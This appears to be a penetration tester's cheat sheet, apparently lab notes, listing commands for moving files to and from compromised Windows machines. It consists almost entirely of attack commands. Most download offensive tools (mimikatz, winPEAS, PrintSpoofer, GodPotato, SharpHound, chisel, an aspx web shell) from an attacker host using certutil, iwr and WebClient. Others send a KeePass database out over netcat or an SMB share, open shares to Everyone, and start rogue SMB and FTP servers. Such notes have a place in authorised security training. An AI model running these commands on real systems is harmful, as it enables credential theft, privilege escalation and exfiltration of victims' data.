# certutil
```bash
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

-----------------------

# powershell
```bash
iwr -uri http://192.168.45.159:1337/winPEASx64.exe -Outfile winPEASx64.exe
```

-----------------------

# Transfer files from window using nc
```bash
Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
nc -l -p 5555 > myfile.txt
```

-----------------------

# Typical files to transfer
```bash
iwr -uri http://192.168.45.159:1337/ncat.exe -Outfile ncat.exe
iwr -uri http://192.168.45.159:1337/mimikatz64.exe -Outfile mimikatz64.exe
iwr -uri http://192.168.45.159:1337/chisel64.exe -Outfile chisel64.exe

iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe

iwr -uri http://192.168.45.159:1337/insomnia_shell.aspx -Outfile insomnia_shell.aspx
iwr -uri http://192.168.45.159:1337/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET2.exe -Outfile GodPotato-NET2.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET35.exe -Outfile GodPotato-NET35.exe
iwr -uri http://192.168.45.159:1337/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe
```

-----------------------

# Other types of file transfer
```bash
(new-object System.Net.WebClient).DownloadFile("http://10.10.122.141/Script/mimikatz64.exe", "C:\TEMP\mimikatz64.exe")
```

-----------------------

# Start SMB server in Kali
```bash
impacket-smbserver smbfolder $(pwd) -smb2support -user sombi -password sombi 
impacket-smbserver -ip 192.168.45.177 -smb2support -username sombi -password sombi SombiShare files
```

-----------------------

# Start SMB server on windows
```bash
# Victim holding file
net share SharedFolder=C:\Path\To\Your\Folder /grant:Everyone,READ

# Connect from victim 2
\\<victim-holding-file-ip>\SharedFolder

# Delete when done
net share SharedFolder /delete

```
-----------------------

# user SMB server within the Windows machine (Powershell)
```bash
$pass = convertto-securestring 'sombi' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('sombi', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.45.245\SombiShare

cd kali:
copy kali:\PrintSpoofer64.exe C:\TEMP
copy kali:\ncat.exe C:\TEMP
copy kali:\SharpHound.exe C:\TEMP
```

-----------------------

# user SMB server within the Windows machine (Native Windows)
```bash
net use X: \\192.168.45.165\smbfolder /user:sombi sombi
xcopy C:\Users\milana\Documents\Database.kdbx X:\ /Y
net use X: /delete
cd /d X:
```

-----------------------
# FTP
```bash
# In Kali
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 --write

# In windows
cd C:\Users\user\Desktop\Tools\Source
 ftp <attacker-ip> 
anonymous
put windows_service.c
```
